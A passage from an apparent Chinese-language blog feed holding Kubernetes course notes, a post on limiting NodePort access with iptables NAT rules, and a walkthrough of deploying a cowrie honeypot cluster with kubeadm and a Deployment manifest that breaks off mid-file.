当中，从而达到“进入”这个进程所在容器的目的。而这个操作所依赖的，乃是一个名叫 setns() 的 Linux 系统调用。</p><p>Volume 机制，允许你将宿主机上指定的目录或者文件，挂载到容器里面进行读取和修改操作。在 rootfs 准备好之后，在执行 chroot 之前，把 Volume 指定的宿主机目录（比如 /home 目录），挂载到指定的容器目录（比如 /test 目录）在宿主机上对应的目录（即 /var/lib/docker/aufs/mnt/[可读写层 ID]/test）上，这个 Volume 的挂载工作就完成了。</p><p>更重要的是，由于执行这个挂载操作时，“容器进程”(容器初始化进程-dockerint)已经创建了，也就意味着此时 Mount Namespace 已经开启了。所以，这个挂载事件只在这个容器里可见。你在宿主机上，是看不见容器内部的这个挂载点的。这就保证了容器的隔离性不会被 Volume 打破。</p><p>这里使用的是 Linux 的绑定挂载（bind mount）机制，它的主要作用就是，允许你将一个目录或者文件，而不是整个设备，挂载到一个指定的目录上。并且，这时你在该挂载点上进行的任何操作，只是发生在被挂载的目录或者文件上，而原挂载点的内容则会被隐藏起来且不受影响。（所有操作都发生在宿主机，而不会影响容器镜像）</p><p>容器 Volume 里的信息，并不会被 docker commit 提交掉；但这个挂载点目录 /test 本身，则会出现在新的镜像当中。</p></blockquote><h3 id="09-从容器到容器云：谈谈Kubernetes的本质"><a href="#09-从容器到容器云：谈谈Kubernetes的本质" class="headerlink" title="09. 从容器到容器云：谈谈Kubernetes的本质"></a>09. 从容器到容器云：谈谈Kubernetes的本质</h3><p><img src="http://xhisall.gitee.io/image/image/1608814135147.png" alt="Alt text"></p><blockquote><p>控制节点，Master：</p><ul><li>kube-apiserver：负责 API 服务</li><li>kube-scheduler：负责调度</li><li>kube-controller-manager：负责容器编排</li><li>etcd：负责存储集群的持久化数据</li></ul><p>计算节点，Worker：</p><ul><li>kubelet：<ul><li>处理容器运行时：CRI</li><li>网络插件和存储插件为容器配置网络和持久化存储：CNI、CSI</li></ul></li></ul><p>从一开始，Kubernetes 项目就没有像同时期的各种“容器云”项目那样，把 Docker 作为整个架构的核心，而仅仅把它作为最底层的一个容器运行时实现。</p><blockquote><p>运行在大规模集群中的各种任务之间，实际上存在着各种各样的关系。这些关系的处理，才是作业编排和管理系统最困难的地方。</p></blockquote><p>Kubernetes 项目最主要的设计思想是，从更宏观的角度，以统一的方式来定义任务之间的各种关系，并且为将来支持更多种类的关系留有余地。</p></blockquote><p> <img src="http://xhisall.gitee.io/image/image/1608814907988.png" alt="Alt text"></p><blockquote><p>从容器出发<br>容器间”紧密协作“ ： pod<br>一次启动多个 pod ： Deployment<br>通过固定的 IP 和端口以负载均衡的方式访问一组 pod ： Service<br>需要配置文件：ConfigMap<br>需要配置隐私文件：Secret<br>需要一次性运行的 Pod：Job<br>需要每个节点上只运行一个副本的守护进程：DaemonSet<br>需要定时任务：Crontab</p><p>Kubernetes 项目并没有像其他项目那样，为每一个管理功能创建一个指令，然后在项目中实现其中的逻辑。这种做法，的确可以解决当前的问题，但是在更多的问题来临之后，往往会力不从心。</p><p>相比之下，在 Kubernetes 项目中，我们所推崇的使用方法是：</p><ul><li>首先，通过一个“编排对象”，比如 Pod、Job、CronJob 等，来描述你试图管理的应用；</li><li>然后，再为它定义一些“服务对象”，比如 Service、Secret、Horizontal Pod Autoscaler（自动水平扩展器）等。这些对象，会负责具体的平台级功能。</li></ul></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://time.geekbang.org/column/intro/116&quot;&gt;深入剖析Kubernetes（极客时间）&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;05-白话容器基础（一）：从进程说开去&quot;&gt;&lt;a href=&quot;#05-白话容器基础（一）：从进程</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>使用 iptables 限制 Kubernetes 的 NodePort 服务</title>
    <link href="http://woodpile27.cn/2020/12/22/use-iptables-to-limit-kubernektes-nodeport-service/"/>
    <id>http://woodpile27.cn/2020/12/22/use-iptables-to-limit-kubernektes-nodeport-service/</id>
    <published>2020-12-22T00:00:00.000Z</published>
    <updated>2020-12-22T12:09:48.843Z</updated>
    
    <content type="html"><![CDATA[<h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>在搭建了 Kubernetes 集群后，在 master 节点上部署了 Dashboard。我们需要在办公网内访问它，修改 service 端口暴露为 NodePort 模式后就可以达到目的。由于 master 节点部署在公网，我们希望对 NodePort 暴露的端口做限制，换句话说，只允许办公网内的 ip 对其进行访问。开始以为会很简单，用 iptables 在 INPUT 链上加一个 DROP 和 ACCEPT 操作就可以了，但事实上并非如此。</p><h3 id="NodePort"><a href="#NodePort" class="headerlink" title="NodePort"></a>NodePort</h3><p>查看 kubernetes-dashboard 命名空间里的 service，kubernetes 创建了一个名为 kubernetes-dashboard 的 NodePort，在主机端口上监听50000端口。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@localhost:~# kubectl get svc --namespace&#x3D;kubernetes-dashboard</span><br><span class="line">NAME                        TYPE        CLUSTER-IP       EXTERNAL-IP   PORT(S)         AGE</span><br><span class="line">dashboard-metrics-scraper   ClusterIP   10.110.216.172   &lt;none&gt;        8000&#x2F;TCP        18h</span><br><span class="line">kubernetes-dashboard        NodePort    10.97.249.27     &lt;none&gt;        443:50000&#x2F;TCP   18h</span><br></pre></td></tr></table></figure><p>只要我们访问 MASTER-IP:50000 就可以进入 Dashboard，是在 iptables 里经历了很多条规则才到达的。</p><ol><li><p>经过 PREROUTING 进入 KUBE-SERVICES。由于 nat 在 filter 之前，所以在 INPUT 链做限制不会起作用。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Chain PREROUTING (policy ACCEPT)</span><br><span class="line">target     prot opt source               destination         </span><br><span class="line">KUBE-SERVICES  all  --  anywhere             anywhere             &#x2F;* kubernetes service portals *&#x2F;</span><br></pre></td></tr></table></figure><p>对应的 iptables 规则（ iptables-save 可查看）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-A OUTPUT -m comment --comment &quot;kubernetes service portals&quot; -j KUBE-SERVICES</span><br></pre></td></tr></table></figure></li><li><p>经过 KUBE-SERVICES 进入 KUBE-NODEPORTS</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Chain KUBE-SERVICES (2 references)</span><br><span class="line">target     prot opt source               destination         </span><br><span class="line">......</span><br><span class="line">KUBE-NODEPORTS  all  --  anywhere             anywhere             &#x2F;* kubernetes service nodeports; NOTE: this must be the last rule in this chain *&#x2F; ADDRTYPE match dst-type LOCAL</span><br></pre></td></tr></table></figure><p>对应的 iptables 规则，可以看到其会是链里的最后一条规则，只有当上边的所有服务规则都不匹配时才会进入 NODEPORTS</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-A KUBE-SERVICES -m comment --comment &quot;kubernetes service nodeports; NOTE: this must be the last rule in this chain&quot; -m addrtype --dst-type LOCAL -j KUBE-NODEPORTS</span><br></pre></td></tr></table></figure></li><li><p>经过 KUBE-NODEPORTS 后，首先经过 KUBE-MARK-MASQ 打上标签，之后进入 KUBE-SVC-CEZPIJSAUFW5MYPQ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Chain KUBE-NODEPORTS (1 references)</span><br><span class="line">target     prot opt source               destination         </span><br><span class="line">KUBE-MARK-MASQ  tcp  --  anywhere             anywhere             &#x2F;* kubernetes-dashboard&#x2F;kubernetes-dashboard *&#x2F; tcp dpt:50000</span><br><span class="line">KUBE-SVC-CEZPIJSAUFW5MYPQ  tcp  --  anywhere             anywhere             &#x2F;* kubernetes-dashboard&#x2F;kubernetes-dashboard *&#x2F; tcp dpt:50000</span><br></pre></td></tr></table></figure><p>对应的 iptables 规则</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> -A KUBE-NODEPORTS -p tcp -m comment --comment &quot;kubernetes-dashboard&#x2F;kubernetes-dashboard&quot; -m tcp --dport 50000 -j KUBE-MARK-MASQ</span><br><span class="line">-A KUBE-NODEPORTS -p tcp -m comment --comment &quot;kubernetes-dashboard&#x2F;kubernetes-dashboard&quot; -m tcp --dport 50000 -j KUBE-SVC-CEZPIJSAUFW5MYPQ</span><br></pre></td></tr></table></figure></li><li><p>经过 KUBE-SVC-CEZPIJSAUFW5MYPQ 进入 KUBE-SEP-QXJL632FHGWBBYEF</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Chain KUBE-SVC-CEZPIJSAUFW5MYPQ (2 references)</span><br><span class="line">target     prot opt source               destination         </span><br><span class="line">KUBE-SEP-QXJL632FHGWBBYEF  all  --  anywhere             anywhere             &#x2F;* kubernetes-dashboard&#x2F;kubernetes-dashboard *&#x2F;</span><br></pre></td></tr></table></figure><p>对应的 iptables 规则</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-A KUBE-SVC-CEZPIJSAUFW5MYPQ -m comment --comment &quot;kubernetes-dashboard&#x2F;kubernetes-dashboard&quot; -j KUBE-SEP-QXJL632FHGWBBYEF</span><br></pre></td></tr></table></figure></li><li><p>经过 KUBE-SEP-QXJL632FHGWBBYEF 的 DNAT 操作转给了 10.244.0.12。正是 kubernetes-dashboard pods 的 IP。 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Chain KUBE-SEP-QXJL632FHGWBBYEF (1 references)</span><br><span class="line">target     prot opt source               destination         </span><br><span class="line">KUBE-MARK-MASQ  all  --  10.244.0.12          anywhere             &#x2F;* kubernetes-dashboard&#x2F;kubernetes-dashboard *&#x2F;</span><br><span class="line">DNAT       tcp  --  anywhere             anywhere             &#x2F;* kubernetes-dashboard&#x2F;kubernetes-dashboard *&#x2F; tcp to:10.244.0.12:8443</span><br></pre></td></tr></table></figure><p>对应的 iptables 规则</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-A KUBE-SEP-QXJL632FHGWBBYEF -s 10.244.0.12&#x2F;32 -m comment --comment &quot;kubernetes-dashboard&#x2F;kubernetes-dashboard&quot; -j KUBE-MARK-MASQ</span><br><span class="line">-A KUBE-SEP-QXJL632FHGWBBYEF -p tcp -m comment --comment &quot;kubernetes-dashboard&#x2F;kubernetes-dashboard&quot; -m tcp -j DNAT --to-destination 10.244.0.12:8443</span><br></pre></td></tr></table></figure></li></ol><h3 id="解决问题"><a href="#解决问题" class="headerlink" title="解决问题"></a>解决问题</h3><p>在知道了原理后，再要解决我们的问题就很容易了，方式其实也有很多种，我直接选择了最粗暴的，那就是在 PREROUTING 中加入一条规则，将不属于公司办公网 sip 的请求直接 DNAT 到65535，一个没有运行任何服务的端口。就解决了问题。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -t nat -I PREROUTING -p tcp ! -s x.x.x.x&#x2F;30 --dport 50000 -j REDIRECT --to-ports 65535</span><br></pre></td></tr></table></figure><h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p><a href="https://juejin.cn/post/6844904098605563912">https://juejin.cn/post/6844904098605563912</a><br><a href="https://zhaohuabing.com/istio-practice/content/ingress/nodeport.html">https://zhaohuabing.com/istio-practice/content/ingress/nodeport.html</a><br><a href="https://www.jianshu.com/p/c6d560d12d50">https://www.jianshu.com/p/c6d560d12d50</a><br><a href="https://developer.aliyun.com/article/745086">https://developer.aliyun.com/article/745086</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h3&gt;&lt;p&gt;在搭建了 Kubernetes 集群后，在 master 节点上部署了 Dashboard。我们需要在办公网内访问它，修改 service </summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>使用 kubernetes 部署分布式蜜罐系统的实践</title>
    <link href="http://woodpile27.cn/2020/12/20/k8s-honeypot/"/>
    <id>http://woodpile27.cn/2020/12/20/k8s-honeypot/</id>
    <published>2020-12-20T00:00:00.000Z</published>
    <updated>2020-12-20T07:57:19.572Z</updated>
    
    <content type="html"><![CDATA[<h3 id="搭建集群"><a href="#搭建集群" class="headerlink" title="搭建集群"></a>搭建集群</h3><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><p>按照 kubernetes 官方文档中安装 kubeadm 的<a href="https://kubernetes.io/zh/docs/setup/production-environment/tools/kubeadm/install-kubeadm/">部分</a>进行安装</p><ul><li>禁用 swap 分区<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">swapoff -a</span><br></pre></td></tr></table></figure></li><li>把 iptables 工具切换到“旧版”模式，按照文档的说明，在较新的 Linux 发行版本中，iptables 工具使用 nftables 后端，其与 kubeadm 不兼容。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">update-alternatives --set iptables &#x2F;usr&#x2F;sbin&#x2F;iptables-legacy</span><br><span class="line">update-alternatives --set ip6tables &#x2F;usr&#x2F;sbin&#x2F;ip6tables-legacy</span><br><span class="line">update-alternatives --set arptables &#x2F;usr&#x2F;sbin&#x2F;arptables-legacy</span><br><span class="line">update-alternatives --set ebtables &#x2F;usr&#x2F;sbin&#x2F;ebtables-legacy</span><br></pre></td></tr></table></figure></li><li>安装 docker ：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install docker.io</span><br></pre></td></tr></table></figure></li><li>安装 kubeadm、kubelet 和 kubectl（国外）<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update &amp;&amp; sudo apt-get install -y apt-transport-https curl</span><br><span class="line">curl -s https:&#x2F;&#x2F;packages.cloud.google.com&#x2F;apt&#x2F;doc&#x2F;apt-key.gpg | sudo apt-key add -</span><br><span class="line">cat &lt;&lt;EOF | sudo tee &#x2F;etc&#x2F;apt&#x2F;sources.list.d&#x2F;kubernetes.list</span><br><span class="line">deb https:&#x2F;&#x2F;apt.kubernetes.io&#x2F; kubernetes-xenial main</span><br><span class="line">EOF</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install -y kubelet kubeadm kubectl</span><br><span class="line">sudo apt-mark hold kubelet kubeadm kubectl</span><br></pre></td></tr></table></figure></li><li>安装 kubeadm、kubelet 和 kubectl（国内）<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> sudo apt-get update &amp;&amp; sudo apt-get install -y apt-transport-https curl</span><br><span class="line"> curl -s https:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;kubernetes&#x2F;apt&#x2F;doc&#x2F;apt-key.gpg | sudo apt-key add -</span><br><span class="line"> cat &lt;&lt;EOF &gt; &#x2F;etc&#x2F;apt&#x2F;sources.list.d&#x2F;kubernetes.list</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;kubernetes&#x2F;apt kubernetes-xenial main</span><br><span class="line">EOF</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install -y kubelet kubeadm kubectl</span><br><span class="line">&#x2F;&#x2F; 下载镜像（worker节点）</span><br><span class="line">kubeadm config images list</span><br><span class="line">docker pull registry.cn-hangzhou.aliyuncs.com&#x2F;google_containers&#x2F;kube-proxy:v1.20.1</span><br><span class="line">docker tag registry.cn-hangzhou.aliyuncs.com&#x2F;google_containers&#x2F;kube-proxy:v1.20.1 k8s.gcr.io&#x2F;kube-proxy:v1.20.1</span><br><span class="line">docker pull registry.cn-hangzhou.aliyuncs.com&#x2F;google_containers&#x2F;pause:3.2</span><br><span class="line">docker tag registry.cn-hangzhou.aliyuncs.com&#x2F;google_containers&#x2F;pause:3.2 k8s.gcr.io&#x2F;pause:3.2</span><br><span class="line">docker pull quay.io&#x2F;coreos&#x2F;flannel:v0.13.1-rc1</span><br></pre></td></tr></table></figure></li></ul><h4 id="Master-节点"><a href="#Master-节点" class="headerlink" title="Master 节点"></a>Master 节点</h4><p>Master 节点我选用了一台已有的 vps 机器中配置最高的，4核8G内存。</p><ul><li>初始化 Master 节点<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kubeadm init --pod-network-cidr&#x3D;10.244.0.0&#x2F;16 \</span><br><span class="line">    --apiserver-cert-extra-sans $&#123;MASTER_PUBIP&#125; \</span><br><span class="line">    --apiserver-advertise-address $&#123;MASTER_PUBIP&#125;  \</span><br><span class="line">    --node-name master01</span><br></pre></td></tr></table></figure></li><li>-pod-network-cidr：指定 pod 网络的 IP 地址范围</li><li>-apiserver-advertise-address：    API 服务器所公布的其正在监听的 IP 地址。使用 Master 节点的公网 ip 地址，在 linode 上可以运行，在一些云服务商上如果公网 ip 没有绑定到网卡上时会无法启动 ETCD</li><li>-apiserver-cert-extra-sans：用于 API Server 服务证书的可选附加主题备用名称（SAN）</li><li>-node-name：节点的 name</li><li>运行 kubectl（root 用户）<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export KUBECONFIG&#x3D;&#x2F;etc&#x2F;kubernetes&#x2F;admin.conf</span><br></pre></td></tr></table></figure></li><li>安装 Pod 网络附加组件 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl apply -f https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;coreos&#x2F;flannel&#x2F;master&#x2F;Documentation&#x2F;kube-flannel.yml</span><br></pre></td></tr></table></figure></li></ul><h4 id="Worker-节点"><a href="#Worker-节点" class="headerlink" title="Worker 节点"></a>Worker 节点</h4><p>Worker 节点上运行蜜罐容器。配置：1核1G内存。跟官方文档推荐的配置有点差距，但也够用了</p><ul><li>加入节点<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kubeadm join $&#123;MASTER_PUBIP&#125;:6443 --token $&#123;TOKEN&#125; \</span><br><span class="line">   --discovery-token-ca-cert-hash sha256:$&#123;HASH&#125;</span><br></pre></td></tr></table></figure></li><li>给工作节点打上标签 type=worker 和位置标签 loc=cn or foreign<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kubectl label nodes $&#123;NODE_NAME&#125; type&#x3D;worker</span><br><span class="line">kubectl label nodes $&#123;NODE_NAME&#125; loc&#x3D;foreign</span><br></pre></td></tr></table></figure></li></ul><h3 id="配置信息"><a href="#配置信息" class="headerlink" title="配置信息"></a>配置信息</h3><p>蜜罐容器需要读取配置文件，我创建了三种配置文件：</p><ul><li>私有镜像仓库密钥，敏感数据，使用 Secret</li><li>蜜罐的配置文件，包含数据管道的地址和验证信息，敏感数据，使用 Secret</li><li>cowrie 的配置文件，非敏感数据，使用 ConfigMap</li></ul><h4 id="创建用于私有镜像仓库鉴权的-Secret"><a href="#创建用于私有镜像仓库鉴权的-Secret" class="headerlink" title="创建用于私有镜像仓库鉴权的 Secret"></a>创建用于私有镜像仓库鉴权的 Secret</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl create secret docker-registry dockerhubsecret --docker-username&#x3D;$&#123;USERNAME&#125;  --docker-password&#x3D;$&#123;PASSWORD&#125;</span><br></pre></td></tr></table></figure><h4 id="创建蜜罐配置文件的-Secret"><a href="#创建蜜罐配置文件的-Secret" class="headerlink" title="创建蜜罐配置文件的 Secret"></a>创建蜜罐配置文件的 Secret</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl create secret generic honeypot-config --from-file&#x3D;config&#x2F;config.toml</span><br></pre></td></tr></table></figure><h4 id="创建-cowrie-配置文件的-ConfigMap"><a href="#创建-cowrie-配置文件的-ConfigMap" class="headerlink" title="创建 cowrie 配置文件的 ConfigMap"></a>创建 cowrie 配置文件的 ConfigMap</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl create configmap cowrie-config --from-file&#x3D;etc&#x2F;</span><br></pre></td></tr></table></figure><h4 id="创建-ServiceAccount"><a href="#创建-ServiceAccount" class="headerlink" title="创建 ServiceAccount"></a>创建 ServiceAccount</h4><p>向 ServiceAccount 中添加镜像拉取密钥可以不必为每个 pod 都单独进行镜像拉取密钥的添加操作</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">ServiceAccount</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">sa</span></span><br><span class="line"><span class="attr">imagePullSecrets:</span></span><br><span class="line"><span class="string">-name:</span> <span class="string">dockerhubsecret</span></span><br></pre></td></tr></table></figure><h3 id="创建-Deployment"><a href="#创建-Deployment" class="headerlink" title="创建 Deployment"></a>创建 Deployment</h3><p>因为 GFW 的存在，在国内和国外部署的蜜罐需要使用不同的数据管道，也就需要使用不同的 ConfigMap。在国内和国外我们创建了两个 Deployment。每个 pod 包含两个容器，分别是我们的蜜罐和 cowrie。</p><ul><li>升级策略：<code>spec.strategy</code> 使用了 Recreate，即在升级时一次性删除所有旧版本的pod后再创建新pod</li><li>节点选择器：<code>spec.template.spec.nodeSelector</code> 选择之前设置的 type 标签选择 worker 节点。根据不同的地址位置选择 loc 标签</li><li>非亲缘性：<code>spec.template.spec.affinity</code> 定义 podAntiAffinity 强制 pod 调度到不同的节点上。</li><li>赋值 ServiceAccount：<code>spec.template.spec.serviceAccountName</code></li><li>使用宿主节点的网络空间：<code>spec.template.spec.hostNetwork</code></li><li>使用特权模式运行pod：<code>spec.template.spec.containers.securityContext</code></li><li>挂载配置文件：<code>spec.template.spec.containers.volumeMounts</code></li><li>存活指针：<code>spec.template.spec.containers.livenessProbe</code></li></ul><p>完整的配置文件放在了最后。</p><h3 id="END"><a href="#END" class="headerlink" title="END"></a>END</h3><ul><li>在部署工作节点时，如果节点的公网 IP 没有绑定到网卡上，需要在 Master 上设置 iptables 规则，将内网 IP 转向外网 IP。<a href="https://www.jianshu.com/p/897e0f14be60">参考</a></li><li>当前的集群配置比较初级，后续还有很大的改进空间。</li><li>《Kubernetes in Action》真的很不错。</li></ul><h3 id="honeypot-deployment-cn-yaml"><a href="#honeypot-deployment-cn-yaml" class="headerlink" title="honeypot-deployment-cn.yaml"></a>honeypot-deployment-cn.yaml</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">apps/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Deployment</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">honeypot-cn</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">replicas:</span> <span class="number">1</span></span><br><span class="line">  <span class="attr">strategy:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">Recreate</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">matchLabels:</span></span><br><span class="line">      <span class="attr">app:</span> <span class="string">honeypot</span></span><br><span class="line">  <span class="attr">template:</span></span><br><span class="line">    <span class="attr">metadata:</span></span><br><span class="line">      <span class="attr">labels:</span></span><br><span class="line">        <span class="attr">app:</span> <span class="string">honeypot</span></span><br><span class="line">    <span class="attr">spec:</span></span><br><span class="line">      <span class="attr">nodeSelector:</span></span><br><span class="line">        <span class="attr">type:</span> <span class="string">&quot;worker&quot;</span></span><br><span class="line">        <span class="attr">loc:</span> <span class="string">&quot;cn&quot;</span></span><br><span class="line">      <span class="attr">affinity:</span></span><br><span class="line">        <span class="attr">podAntiAffinity:</span></span><br><span class="line">          <span class="attr">requiredDuringSchedulingIgnoredDuringExecution:</span></span><br><span class="line">          <span class="bullet">-</span> <span class="attr">topologyKey:</span> <span class="string">kubernetes.io/hostname</span></span><br><span class="line">            <span class="attr">labelSelector:</span></span><br><span class="line">              <span class="attr">matchLabels:</span></span><br><span class="line">                <span class="attr">app:</span> <span class="string">honeypot</span></span><br><span class="line">      <span class="attr">serviceAccountName:</span> <span class="string">sa</span></span><br><span class="line">      <span class="attr">hostNetwork:</span> <span class="literal">true</span></span><br><span class="line">      <span class="attr">containers:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">image:</span> <span class="string">xxxxx/xxxxxx</span></span><br><span class="line">        <span class="attr">name:</span> <span class="string">main</span></span><br><span class="line">        <span class="attr">volumeMounts:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">honeypot-config</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/config/</span></span><br><span class="line">        <span class="attr">securityContext:</span></span><br><span class="line">          <span class="attr">privileged:</span> <span class="literal">true</span></span><br><span class="line">        <span class="attr">livenessProbe:</span></span><br><span class="line">          <span class="attr">tcpSocket:</span></span><br><span class="line">            <span class="attr">port:</span> <span class="string">xxx</span></span><br><span class="line">          <span class="attr">initialDelaySeconds:</span> <span class="number">20</span></span><br><span class="line">          <span class="attr">timeoutSeconds:</span> <span class="number">5</span></span><br><span class="line">          <span class="attr">periodSeconds:</span> <span class="number">600</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">image:</span> <span class="string">cowrie/cowrie</span></span><br><span class="line">        <span class="attr">name:</span> <span class="string">cowrie</span></span><br><span class="line">        <span class="attr">volumeMounts:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">cowrie-config</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/cowrie/cowrie-git/etc</span></span><br><span class="line">        <span class="attr">livenessProbe:</span></span><br><span class="line">          <span class="attr">tcpSocket:</span></span><br><span class="line">            <span class="attr">port:</span> <span class="string">xxx</span></span><br><span class="line">          <span class="attr">initialDelaySeconds:</span> <span class="number">20</span></span><br><span class="line">          <span class="attr">timeoutSeconds:</span> <span class="number">5</span></span><br><span class="line">          <span class="attr">periodSeconds:</span> <span class="number">10</span></span><br><span class="line">      <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">honeypot-config</span></span><br><span class="line">        <span class="attr">secret:</span></span><br><span class="line">          <span class="attr">secretName:</span> <span class="string">honeypot-config</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span 